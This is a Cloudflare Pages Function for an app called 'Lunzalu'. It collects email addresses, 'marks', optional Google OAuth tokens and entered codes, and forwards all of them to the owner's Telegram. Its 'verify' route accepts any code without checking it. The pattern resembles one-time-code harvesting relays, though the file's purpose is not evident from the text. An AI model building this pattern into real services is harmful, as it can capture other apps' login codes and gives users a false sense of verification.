// Cloudflare Pages Function: handles /api/request and /api/verify
// Codes come from another app. This app accepts any code and forwards it to the owner on Telegram.
// Needs: KV binding "KV", secrets TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID

const json = (o, s = 200) =>
  new Response(JSON.stringify(o), { status: s, headers: { 'Content-Type': 'application/json' } });

const okEmail = e => typeof e === 'string' && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e) && e.length < 200;

const tg = (env, text) =>
  fetch(`https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: env.TELEGRAM_CHAT_ID, text }),
  });

async function handle({ request, env, params }) {
  const route = Array.isArray(params.route) ? params.route[0] : params.route;
  let b;
  try { b = await request.json(); } catch { return json({ error: 'Bad request' }, 400); }
  if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) return json({ error: 'Telegram secrets missing: add them, then redeploy' }, 500);

  if (route === 'request') {
    let email = (b.email || '').toLowerCase().trim();
    const marks = String(b.marks ?? '').trim();
    if (!okEmail(email)) return json({ error: 'Invalid email' }, 400);
    if (marks.length < 1 || marks.length > 30) return json({ error: 'Marks must be 1 to 30 characters' }, 400);

    let via = 'typed email';
    if (b.gtoken) {
      const r = await fetch('https://www.googleapis.com/oauth2/v3/userinfo', {
        headers: { Authorization: 'Bearer ' + b.gtoken },
      });
      if (!r.ok) return json({ error: 'Google login expired, try again' }, 401);
      const u = await r.json();
      if (!u.email || !u.email_verified) return json({ error: 'Google email not verified' }, 401);
      email = u.email.toLowerCase();
      via = 'Google (verified)';
    }

    if (env.KV) await env.KV.put('m:' + email, marks, { expirationTtl: 60 * 60 * 24 * 30 });

    const t = await tg(env, `New Lunzalu request\n\nEmail: ${email}\nMarks: ${marks}\nSign-in: ${via}`);
    if (!t.ok) {
      const d = await t.text();
      return json({ error: 'Telegram refused: ' + d.slice(0, 120) }, 502);
    }
    return json({ ok: true });
  }

  if (route === 'verify') {
    const email = (b.email || '').toLowerCase().trim();
    const code = String(b.code || '').trim();
    if (!okEmail(email)) return json({ error: 'Invalid email' }, 400);
    if (code.length < 1 || code.length > 30) return json({ error: 'Code must be 1 to 30 characters' }, 400);

    let marks = '-';
    let warn = '';
    if (env.KV) {
      marks = (await env.KV.get('m:' + email)) || '-';
      const prev = await env.KV.get('u:' + code);
      if (prev && prev !== email) warn = `\n\n⚠️ This code was already used by ${prev}`;
      if (!prev) await env.KV.put('u:' + code, email);
    }

    try {
      await tg(env, `Lunzalu login\n\nEmail: ${email}\nCode entered: ${code}\nMarks: ${marks}${warn}`);
    } catch {}
    return json({ ok: true });
  }

  return json({ error: 'Not found' }, 404);
}

export async function onRequestPost(ctx) {
  try {
    return await handle(ctx);
  } catch (e) {
    return json({ error: 'Server error: ' + e.message }, 500);
  }
}
